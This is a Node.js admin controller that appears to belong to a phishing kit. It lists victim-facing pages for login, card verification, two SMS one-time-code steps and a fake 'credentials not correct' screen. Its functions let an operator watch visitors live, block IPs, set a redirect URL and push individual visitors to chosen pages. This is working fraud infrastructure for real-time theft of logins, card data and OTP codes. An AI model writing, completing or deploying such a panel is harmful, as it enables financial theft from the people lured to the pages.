const blockerService = require('../services/blocker.service');
const monitorService = require('../services/monitor.service');
const redirectService = require('../services/redirect.service');
const userActionService = require('../services/userAction.service');
const { ROUTES } = require('../config/constants');

// Pages the admin can send a user to from the dashboard
const APP_PAGES = [
    { label: 'Login', path: ROUTES.LOGIN },
    { label: 'Card verification', path: ROUTES.CARD_VERIFICATION },
    { label: 'SMS 1 (OTP)', path: ROUTES.SMS_1 },
    { label: 'SMS 2 (OTP)', path: ROUTES.SMS_2 },
    { label: 'Done / Success', path: ROUTES.DONE },
    { label: 'Credentials not correct', path: ROUTES.INVALID_CREDENTIALS }
];

class AdminController {
    renderAdmin(req, res) {
        res.render('chulda', {
            appPages: APP_PAGES
        });
    }

    // JSON snapshot consumed by the dashboard (polling)
    getStats(req, res) {
        res.json(monitorService.getSnapshot(blockerService.getBlockedIps()));
    }

    handleBlockAction(req, res) {
        const { type, ip } = req.body;

        if (!ip) {
            return res.status(400).json({ OK: false, message: 'La dirección IP es obligatoria' });
        }

        if (type === 'block') {
            blockerService.blockIp(ip);
            return res.json({ OK: true, type: 'bad', blockedIps: blockerService.getBlockedIps() });
        } else {
            blockerService.unblockIp(ip);
            return res.json({ OK: true, type: 'good', blockedIps: blockerService.getBlockedIps() });
        }
    }

    getRedirectUrl(req, res) {
        res.json({ OK: true, url: redirectService.getUrl() });
    }

    updateRedirectUrl(req, res) {
        const { url } = req.body;
        if (!url || !String(url).trim()) {
            return res.status(400).json({ OK: false, message: 'La URL es obligatoria' });
        }
        const saved = redirectService.setUrl(url);
        if (!saved) {
            return res.status(500).json({ OK: false, message: 'No se pudo guardar la URL' });
        }
        res.json({ OK: true, url: redirectService.getUrl() });
    }

    scheduleUserRedirect(req, res) {
        const { ip, target } = req.body;
        if (!ip || !target) {
            return res.status(400).json({ OK: false, message: 'IP y destino son obligatorios' });
        }
        const valid = APP_PAGES.some(p => p.path === target);
        if (!valid) {
            return res.status(400).json({ OK: false, message: 'Destino no válido' });
        }
        userActionService.schedule(ip, target);
        res.json({ OK: true, ip, target });
    }
}

module.exports = new AdminController();
